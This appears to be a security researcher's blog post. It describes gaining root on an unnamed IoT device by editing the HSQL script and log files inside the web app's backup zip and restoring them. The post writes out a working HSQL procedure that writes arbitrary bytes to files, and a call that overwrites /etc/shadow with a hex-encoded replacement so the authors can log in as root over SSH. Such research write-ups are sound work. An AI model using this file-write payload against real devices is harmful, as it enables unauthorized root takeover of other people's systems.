---
title:  "HSQL to shell access"
category: posts
date: 2022-08-26
toc: true
toc_label: "Contents"
toc_sticky: true
category: Research
tags: [IoT, research, HSQL ]
excerpt: "Exploiting a web application backup and restore feature, running with root permission, that exposes a HSQL script to gain SSH access to the system."
---

## Exploitation
I recently came across with an IoT device that I was doing research on, along with my colleague [Perses](https://persees.github.io/) which had a lot of services exposed, one of those being a web application that allowed a user to manage the device. Oddly enough, this web application didn't have any kind of default authentication, and was a feature that the user needed to activate if he so desired. <br>
After a bit of time studying the application, one of its features caught our attention - backup and restore. <br>
When backing up data from the device, it would generate a file with an extension that neither of us had ever seen, but after using the "file" command we realized that it was just a zip file... seriously!<br>

<p align="center">
    <img src="/assets/images/hsql_to_shell/facepalm.jpg" alt="drawing" width="350"/>
</p>


Unzipping the file, and we got a lot of configuration files (JSON and XML), mostly device names and IDs, some images and an HSQL script and log file... I have never used HSQL but according to this [link](https://stackoverflow.com/questions/6471969/hsqldb-which-is-the-main-database-file) the script file contained all the statements to create the tables, alter them and insert the data, and the log file contained internal log statements of running transactions and some commit or rollback points. <br>
Going through the HSQL [documentation](http://www.hsqldb.org/doc/2.0/guide/running-chapt.html#rgc_hsqldb_db) a database is called a catalog and in order to load a catalog from a file one needed 2 of 6 possible files, all with the same name but with different extensions... and we got 2! The log file and the script file... perfect.<br>

<p align="center">
    <img src="/assets/images/hsql_to_shell/perfect.jpg" alt="drawing" width="350"/>
</p>

Downloaded the HSQL jar file and opened the in my local machine. <br>
For the username, I went with the default one - SA, and it worked (why wouldn't it?). The database had all the information that I had created via the web application interface, including a new user! <br>
As a sanity check, I changed the username value in the script file, zipped the directory and used the restore feature of the web application to confirm if the script was being used to fill the database... and it was! After the restore, the username had changed!<br>

So, exploring a bit more about this database, [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/9001-pentesting-hsqldb) revealed a way of writing to the file system. Because this is a IoT device we already had access to the file system, we had previously reverse engineered the firmware to extract the rootfs which revealed that the system only had one user, root (from the /etc/passwd analazys). The UART interface was also available along with SSH service, but we didn't have the root password, so we hadn't been able to access it, but since root was the only user available that meant the web application had to running with root permissions! <br>
From this assumption, we decided to test overwriting the /etc/shadow file to change the root user password and gain access to the system using the SSH available service, or at least that was the plan. For that, we created a procedure that received a string, the path to the file to be overwritten, and a byte array with the data to be written and using JAVA we would write to a file in the file system. <br>
```sql
CREATE PROCEDURE PUBLIC.WRITETOFILE(IN PARAMSTRING VARCHAR(2048),IN PARAMARRAYOFBYTE VARBI NARY(2048)) SPECIFIC WRITETOFILE_10193 LANGUAGE JAVA DETERMINISTIC NO SQL NEW SAVEPOINT LEVEL EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writ
eBytesToFilename'

call writetofile('/etc/shadow', cast('726f6f743a364b506b65385a4930645155363a31393139393a303a39393939393a373a3a3a0a6461656d6f6e3a2a3a31393139393a303a39393939393a373a3a3a0a62696e3a2a3a31393139393a303a39393939393a373a3a3a0a7379733a2a3a31393139393a303a39393939393a373a3a3a0a73796e33a2a3a31393139393a303a39393939393a373a3a3a0a67616d65733a2a3a31393139393a303a39393939393a373a3a3a0a6d616e3a2a3a31393139393a303a39393939393a373a3a3a0a6c703a2a3a31393139393a303a39393939393a373a3a3a0a6d61696c3a2a3a31393139393a303a39393939393a33a3a3a0a6e6577733a2a3a31393139393a303a39393939393a373a3a3a0a757563703a2a3a31393139393a303a39393939393a373a3a3a0a70726f78793a2a3a31393139393a303a39393939393a373a3a3a0a7777772d646174613a2a3a31393139393a303a39393939393a373a3a3a0a6261636b75703aa3a31393139393a303a39393939393a373a3a3a0a6c6973743a2a3a31393139393a303a39393939393a373a3a3a0a6972633a2a3a31393139393a303a39393939393a373a3a3a0a676e6174733a2a3a31393139393a303a39393939393a373a3a3a0a6e6f626f64793a2a3a31393139393a303a3939393933a373a3a3a0a5f6170743a2a3a31393139393a303a39393939393a373a3a3a0a73797374656d642d74696d6573796e633a2a3a31393139393a303a39393939393a373a3a3a0a73797374656d642d6e6574776f726b3a2a3a31393139393a303a39393939393a373a3a3a0a73797374656d642d7265736f6c6653a2a3a31393139393a303a39393939393a373a3a3a0a6e74703a2a3a31393139393a303a39393939393a373a3a3a0a6d6573736167656275733a2a3a31393139393a303a39393939393a373a3a3a0a61766168693a2a3a31393139393a303a39393939393a373a3a3a0a6d6f7371756974746f3a2a3a3393139393a303a39393939393a373a3a3a0a737368643a2a3a31393139393a303a39393939393a373a3a3a0a75756964643a2a3a31393139393a303a39393939393a373a3a3a0a' AS VARBINARY(2048)))
```

Then we just had to call the procedure giving it the path to the shadow file and a hexadecimal string of its contents, that would be cast.<br>

Testing this locally in our database, it worked, but when we tried on the device it didn't... What was wrong? We downloaded the new backup file in order to see what was on the database, and we found that the procedure was created, but the call was not... after a bit more digging we discovered that it was almost right at the first try, but instead of calling the procedure from the script file we needed to use the log file instead. (Note the set schema at the beginning)<br>
```sql
/*C3*/SET SCHEMA PUBLIC
call writetofile('/etc/shadow', cast('726f6f743a364b506b65385a4930645155363a31393139393a303a39393939393a373a3a3a0a6461656d6f6e3a2a3a31393139393a303a39393939393a373a3a3a0a62696e3a2a3a31393139393a303a39393939393a373a3a3a0a7379733a2a3a31393139393a303a39393939393a373a3a3a0a73796e33a2a3a31393139393a303a39393939393a373a3a3a0a67616d65733a2a3a31393139393a303a39393939393a373a3a3a0a6d616e3a2a3a31393139393a303a39393939393a373a3a3a0a6c703a2a3a31393139393a303a39393939393a373a3a3a0a6d61696c3a2a3a31393139393a303a39393939393a33a3a3a0a6e6577733a2a3a31393139393a303a39393939393a373a3a3a0a757563703a2a3a31393139393a303a39393939393a373a3a3a0a70726f78793a2a3a31393139393a303a39393939393a373a3a3a0a7777772d646174613a2a3a31393139393a303a39393939393a373a3a3a0a6261636b75703aa3a31393139393a303a39393939393a373a3a3a0a6c6973743a2a3a31393139393a303a39393939393a373a3a3a0a6972633a2a3a31393139393a303a39393939393a373a3a3a0a676e6174733a2a3a31393139393a303a39393939393a373a3a3a0a6e6f626f64793a2a3a31393139393a303a3939393933a373a3a3a0a5f6170743a2a3a31393139393a303a39393939393a373a3a3a0a73797374656d642d74696d6573796e633a2a3a31393139393a303a39393939393a373a3a3a0a73797374656d642d6e6574776f726b3a2a3a31393139393a303a39393939393a373a3a3a0a73797374656d642d7265736f6c6653a2a3a31393139393a303a39393939393a373a3a3a0a6e74703a2a3a31393139393a303a39393939393a373a3a3a0a6d6573736167656275733a2a3a31393139393a303a39393939393a373a3a3a0a61766168693a2a3a31393139393a303a39393939393a373a3a3a0a6d6f7371756974746f3a2a3a3393139393a303a39393939393a373a3a3a0a737368643a2a3a31393139393a303a39393939393a373a3a3a0a75756964643a2a3a31393139393a303a39393939393a373a3a3a0a' AS VARBINARY(2048)))
```

Resetting the device to make sure the procedure was not already there and restoring it again, gave us root access when we tried to access the SSH service!


